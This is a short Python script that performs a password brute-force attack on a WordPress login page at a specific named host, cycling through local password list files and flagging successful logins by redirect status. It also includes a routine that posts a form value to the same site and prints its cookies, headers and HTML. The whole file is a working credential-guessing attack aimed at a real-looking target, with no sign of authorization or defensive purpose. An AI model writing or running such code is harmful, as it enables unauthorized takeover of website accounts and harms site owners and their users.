from os.path import isfile, join
from os import listdir
import requests

wp_login = 'https://rs11.glorifykickstarter.com/wp-login.php'
wp_admin = 'https://rs11.glorifykickstarter.com/wp-admin/'
username = 'cybersecurity'
password = 'admin'
PSSWD_PATH = "passwd/"
password_files = [f for f in listdir(PSSWD_PATH) if isfile(join(PSSWD_PATH, f))]

def parse_html(r):
    from bs4 import BeautifulSoup

    c = r.content
    soup = BeautifulSoup(c, 'html.parser')
    print(soup)

def req(s, pwd):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0',
    }
    data = {
        'log': username, 'pwd': pwd, 'wp-submit': 'Log In',
        'redirect_to': wp_admin, 'testcookie': '1'
    }
    r = s.post(wp_login, headers=headers, data=data, allow_redirects=False)

    if r.status_code in [302, 303]:
        print("hit")
    elif r.status_code == 200:
        print("no hit")
    else:
        print("error")

    print("status: " + str(r.status_code) +" ; passwd: " + pwd)

def names_cs_post(s):
    # headers = {
    #     'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0',
    # }
    # r = s.get('https://rs11.glorifykickstarter.com/names_cs?mf-names=Guilherme+Pereira', headers=headers, allow_redirects=True)
    # Not a GET request since names_cs page has submit button (embedded html) within form.
    # Form sends POST request on submit, assuming ` onSubmit=${ validation.handleSubmit( parent.handleFormSubmit ) } ` -> is a POST method.
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0',
    }
    data = {
        'mf-names': 'Guilherme Pereira', 'testcookie': '1'
    }
    r = s.post('https://rs11.glorifykickstarter.com/names_cs', headers=headers, data=data, allow_redirects=False)
    
    print("response cookies: " + str(r.cookies))
    print("\t---")
    print("headers: " + str(r.headers))
    print("\t---")
    print("status: " + str(r.status_code))

    ch = input("Parse HTML ? (y)\t")
    if ch == 'y':
        parse_html(r)

def loop():
    with requests.Session() as s:
        for f in password_files:
            plist = open(PSSWD_PATH+f, "r")
            for pwd in plist.readlines():
                req(s, pwd)

def single():
    with requests.Session() as s:
        names_cs_post(s)


if __name__ == "__main__":
    # single()
    loop()